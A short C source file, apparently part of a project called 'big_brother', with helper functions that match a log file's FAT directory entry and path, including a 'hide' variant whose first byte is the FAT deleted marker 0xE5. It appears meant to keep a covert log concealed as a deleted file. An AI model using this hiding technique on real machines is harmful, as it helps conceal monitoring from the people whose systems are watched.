#include "big_brother.h"
#include <stdio.h>
#include <string.h>
#include "fat_filename_util.h"

int is_log_file_dentry(unsigned char *base_name, unsigned char *extension) {
    char basename_cmp[] = LOG_FILE_BASENAME;
    basename_cmp[0] = (char)FAT_FILENAME_DELETED_CHAR;
    return strncmp(basename_cmp, (char *)base_name, 3) == 0 &&
           strncmp(LOG_FILE_EXTENSION, (char *)extension, 3) == 0;
}

int is_log_filepath(char *filepath) {
    return strncmp(LOG_FILE, filepath, 8) == 0;
}

int is_hide_filepath(char *filepath) {
    char hidename[] = LOG_FILE; hidename[1] = 0xe5; 
    return strncmp(hidename, filepath, 8) == 0;
}

